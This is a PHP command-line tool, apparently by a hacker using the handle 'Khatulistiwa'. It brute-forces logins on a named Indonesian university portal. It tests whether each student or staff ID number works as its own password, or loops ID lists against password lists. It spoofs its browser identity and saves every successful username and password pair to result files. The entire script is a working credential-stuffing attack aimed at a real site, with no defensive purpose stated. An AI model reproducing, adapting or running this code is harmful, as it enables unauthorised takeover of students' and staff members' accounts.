<?php

error_reporting(0);

include "conf.php";

function banner() {
	global $clear, $merah, $hijau;

	echo $hijau;
 	echo "  ____             _       _____           _        _ \n";
 	echo " |  _ \           | |     |  __ \         | |      | |\n";
	echo " | |_) |_ __ _   _| |_ ___| |__) |__  _ __| |_ __ _| |\n";
 	echo " |  _ <| '__| | | | __/ _ \  ___/ _ \| '__| __/ _` | |\n";
	echo " | |_) | |  | |_| | ||  __/ |  | (_) | |  | || (_| | |\n";
 	echo " |____/|_|   \__,_|\__\___|_|   \___/|_|   \__\__,_|_|\n\n";

	echo $merah;
	echo "    Coded by Khatulistiwa";
	echo $clear;     

	menu();
}

function menu() {
	global $clear, $merah, $kuning, $cyan;

	echo "\n\n{$cyan}1. Weak Password (Password = NIM/NIP)";
	echo "\n2. BruteForce Password by NIM/NIP";
	echo "\n\n{$kuning}Masukkan pilihan: ";
	$pilih = trim(fgets(STDIN));

	if ($pilih == 1) {
		weakPass();
	} else if ($pilih == 2) {
		brutePassByNimNip();
	} else {
		echo "\n{$merah}Pilihan anda tidak valid!{$clear}\n";
	}
}

function weakPass() {
	global $clear, $merah, $hijau, $kuning, $jumlah, $successLogin;
	$no = 0;

	echo "{$clear}Masukkan file list (ex: list.txt): ";
	$input = trim(fgets(STDIN));
	$listNimNip = explode(PHP_EOL, file_get_contents($input));

	if (!file_exists($input)) {
		die(PHP_EOL . "{$merah}File tidak ada!{$clear}" . PHP_EOL);
	} else {
		echo PHP_EOL;
		foreach($listNimNip as $nimNip) {
			$result = brutePass($nimNip, $nimNip);

			if ($result == $successLogin) {
				echo "{$clear}" . ++$no . ". {$nimNip} : {$nimNip} {$kuning}--> {$hijau}Berhasil Login" . PHP_EOL;
				$jumlah++;

				// save result
				$date = date('d-m-Y');
				$fp = fopen("./result/weakpass/$date.txt", 'a+');
				fwrite($fp, "$nimNip" . PHP_EOL);
				fclose($fp);
			} else {
				echo "{$clear}" . ++$no . ". {$nimNip} : {$nimNip} {$kuning}--> {$merah}Gagal login" . PHP_EOL;
			}
		}
	}

	echo PHP_EOL . "{$hijau}Berhasil login {$jumlah} akun!{$clear}";
}

function brutePassByNimNip() {
	global $clear, $merah, $hijau, $kuning, $jumlah, $successLogin;
	$no = 0;

	echo "{$clear}Masukkan file list NIM/NIP (ex: user.txt): ";
	$inputNimNip = trim(fgets(STDIN));
	$listNimNip = explode(PHP_EOL, file_get_contents($inputNimNip));

	echo "{$clear}Masukkan file list password (ex: pass.txt): ";
	$inputPass = trim(fgets(STDIN));
	$listPass = explode(PHP_EOL, file_get_contents($inputPass));

	if (!file_exists($inputNimNip) || !file_exists($inputPass)) {
		die(PHP_EOL . "{$merah}File NIM/NIP dan/atau password tidak ada!{$clear}" . PHP_EOL);
	} else {
		echo PHP_EOL;
		foreach($listNimNip as $noNimNip => $nimNip) {
			foreach($listPass as $noPass => $pass) {
				if (brutePass($nimNip, $pass) == $successLogin) {
					echo "{$clear}" . ++$no . ". {$nimNip} : {$pass} {$kuning}--> {$hijau}Berhasil Login" . PHP_EOL;
					$jumlah++;

					# save result
					$date = date('d-m-Y');
					$fp = fopen("./result/brutepass/$date.txt", 'a+');
					fwrite($fp, "{$nimNip} : {$pass}" . PHP_EOL);
					fclose($fp);

					break;
				} else {
					echo "{$clear}" . ++$no . ". {$nimNip} : {$pass} {$kuning}--> {$merah}Gagal login" . PHP_EOL;
				}
			}
		}
	}

	echo PHP_EOL . "{$hijau}Berhasil login {$jumlah} akun!{$clear}";
}

function brutePass($nimNip, $pass) {
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, 'http://portal.unimal.ac.id/index.php?pModule=zdKbnKU=&pSub=zdKbnKU=&pAct=0dWjppyl');
	curl_setopt($curl, CURLOPT_POST, true);
	curl_setopt($curl, CURLOPT_POSTFIELDS, [
						'username' => $nimNip,
						'password' => $pass
					]);
	curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookie.txt');
	curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36');
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($curl, CURLOPT_REFERER, 'http://portal.unimal.ac.id/index.php');
	curl_exec($curl);
	$redirect = curl_getinfo($curl, CURLINFO_EFFECTIVE_URL);
	curl_close($curl);

	return $redirect;
}

banner();